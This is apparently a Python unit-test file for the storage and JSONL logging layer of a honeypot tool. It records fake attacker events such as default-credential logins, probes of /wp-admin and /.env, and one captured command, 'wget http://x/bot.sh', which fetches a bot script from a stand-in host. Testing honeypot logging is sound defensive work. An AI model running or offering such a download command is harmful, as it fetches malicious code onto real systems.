"""Storage layer: SQLite round-trips and the JSONL export."""

from __future__ import annotations

import json
import time
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from honeyforge.events import Event
from honeyforge.storage import JsonlEventLog, Storage

from .util import Harness


class StorageBasics(unittest.TestCase):
    def setUp(self) -> None:
        self.storage = Storage(":memory:")

    def tearDown(self) -> None:
        self.storage.close()

    def test_record_and_read_events(self) -> None:
        now = time.time()
        self.storage.record_event(Event(type="connection", src_ip="10.0.0.1",
                                        service="http", dst_port=8080))
        self.storage.record_event(Event(type="http_request", src_ip="10.0.0.1",
                                        service="http", dst_port=8080,
                                        details={"path": "/wp-admin"}))
        rows = self.storage.recent_events(10)
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["type"], "http_request")  # newest first
        self.assertEqual(rows[0]["details"]["path"], "/wp-admin")
        self.assertAlmostEqual(rows[1]["ts"], now, delta=5)

    def test_counts_and_tops(self) -> None:
        for ip in ("10.0.0.1", "10.0.0.1", "10.0.0.2"):
            self.storage.record_event(Event(type="connection", src_ip=ip, service="ssh"))
        counts = self.storage.counts()
        self.assertEqual(counts["events"], 3)
        self.assertEqual(counts["unique_ips"], 2)
        top = self.storage.top_ips(5)
        self.assertEqual(top[0]["src_ip"], "10.0.0.1")
        self.assertEqual(top[0]["hits"], 2)

    def test_logins_and_credentials(self) -> None:
        self.storage.record_login(time.time(), "telnet", "10.0.0.9", "root", "admin", True)
        self.storage.record_login(time.time(), "telnet", "10.0.0.9", "root", "admin", True)
        self.storage.record_login(time.time(), "ftp", "10.0.0.9", "admin", "1234", True)
        rows = self.storage.recent_logins(10)
        self.assertEqual(len(rows), 3)
        creds = self.storage.top_credentials(5)
        self.assertEqual(creds[0]["username"], "root")
        self.assertEqual(creds[0]["uses"], 2)

    def test_alerts(self) -> None:
        self.storage.record_alert(time.time(), "brute_force", "high", "10.1.1.1",
                                  "many attempts", {"attempts": 5})
        row = self.storage.recent_alerts(1)[0]
        self.assertEqual(row["alert_type"], "brute_force")
        self.assertEqual(row["severity"], "high")
        self.assertEqual(json.loads(row["details_json"]), {"attempts": 5})

    def test_top_http_paths_and_timeline(self) -> None:
        for path in ("/wp-admin", "/wp-admin", "/.env"):
            self.storage.record_event(Event(type="http_request", service="http",
                                            details={"path": path}))
        self.storage.record_event(Event(type="connection", service="http"))
        paths = self.storage.top_http_paths(5)
        self.assertEqual(paths[0]["path"], "/wp-admin")
        self.assertEqual(paths[0]["hits"], 2)
        timeline = self.storage.timeline(1, 2)
        self.assertEqual(len(timeline), 2)
        self.assertEqual(sum(t["count"] for t in timeline), 4)

    def test_persists_to_disk(self) -> None:
        with TemporaryDirectory() as tmp:
            path = str(Path(tmp) / "pot.db")
            store = Storage(path)
            store.record_event(Event(type="connection", src_ip="10.0.0.7"))
            store.close()
            reopened = Storage(path)
            rows = reopened.recent_events(5)
            reopened.close()
            self.assertEqual(len(rows), 1)
            self.assertEqual(rows[0]["src_ip"], "10.0.0.7")


class JsonlTests(unittest.TestCase):
    def test_jsonl_log_lines(self) -> None:
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "events.jsonl"
            log = JsonlEventLog(str(path))
            log.record(Event(type="command", src_ip="10.0.0.1",
                             details={"command": "wget http://x/bot.sh"}))
            log.close()
            lines = path.read_text().strip().splitlines()
            self.assertEqual(len(lines), 1)
            payload = json.loads(lines[0])
            self.assertEqual(payload["type"], "command")
            self.assertEqual(payload["details"]["command"], "wget http://x/bot.sh")


class HarnessWiringTests(unittest.TestCase):
    def test_harness_bus_persists_to_storage(self) -> None:
        harness = Harness()
        self.addCleanup(harness.storage.close)
        harness.bus.publish(Event(type="connection", src_ip="10.2.3.4"))
        rows = harness.storage.recent_events(5)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["src_ip"], "10.2.3.4")


if __name__ == "__main__":
    unittest.main()
